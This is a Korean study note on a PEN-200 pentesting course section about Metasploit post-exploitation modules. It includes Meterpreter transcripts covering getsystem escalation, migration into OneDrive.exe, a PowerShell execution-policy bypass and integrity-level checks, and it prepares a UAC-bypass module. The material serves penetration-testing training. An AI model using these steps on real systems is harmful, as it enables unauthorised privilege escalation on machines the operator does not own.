# 21.3.2 포스트 익스플로잇 모듈

> **Post-Exploitation Modules** · PEN-200 §21.3.2

Meterpreter 의 내장 명령 말고도, 살아 있는 세션에 대고 실행하는 포스트 익스플로잇(post-exploitation) 모듈군이 따로 있음.

클라이언트 사이드 공격 같은 경로로 얻은 세션은 대개 비특권 셸임. 다만 타겟 사용자가 로컬 administrators 그룹 소속이면 UAC(User Account Control)를 우회해 high integrity 셸로 올릴 여지가 생김.

전제는 앞 절과 같음 — bind 셸에서 `met.exe` 를 내려받아 실행해 세션을 얻고, `getsystem` 으로 승격한 뒤 `ps` 로 찾은 `OneDrive.exe` 로 `migrate` 한 상태. 이주 결과 컨텍스트는 사용자 offsec 이며, 관리자 계정이지만 UAC 때문에 관리 작업은 막혀 있음.

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > ps
```

**무결성 수준부터 확인함.** 프로세스의 integrity level 은 Process Explorer 나 서드파티 PowerShell 모듈 `NtObjectManager` 로 확인함. 후자는 `Import-Module` 로 올린 뒤 `Get-NtTokenIntegrityLevel` 이 현재 프로세스의 액세스 토큰을 읽어 수준을 출력함.

```
meterpreter > shell

Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```

**우회 전에 세션을 뒤로 보냄.** `^Z` 로 채널을, `bg` 로 세션을 백그라운드로 돌려야 msfconsole 프롬프트로 빠져나와 모듈을 검색·실행할 수 있음.

```
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y
meterpreter > bg
[*] Backgrounding session 9...
```

**포스트 익스플로잇 모듈의 핵심 옵션은 `SESSION`.** 여기에 세션 ID 를 넣으면 그 활성 세션 위에서 익스플로잇이 바로 돌아감. `LHOST` 를 맞추고 `run` 하면 새 Meterpreter 세션이 열림.
